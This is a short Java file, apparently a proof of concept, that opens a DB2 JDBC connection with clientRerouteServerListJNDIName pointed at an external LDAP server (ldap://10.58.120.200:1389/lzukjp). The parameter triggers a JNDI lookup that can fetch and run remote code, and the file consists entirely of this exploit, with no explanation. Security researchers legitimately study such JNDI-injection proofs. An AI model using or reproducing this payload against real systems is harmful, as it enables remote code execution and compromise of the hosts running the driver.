package db2;

import java.sql.DriverManager;
import java.sql.SQLException;
import com.ibm.db2.jcc.DB2Driver;

public class JNDI {

    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("com.ibm.db2.jcc.DB2Driver");
        DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=ldap://10.58.120.200:1389/lzukjp");
    }
}
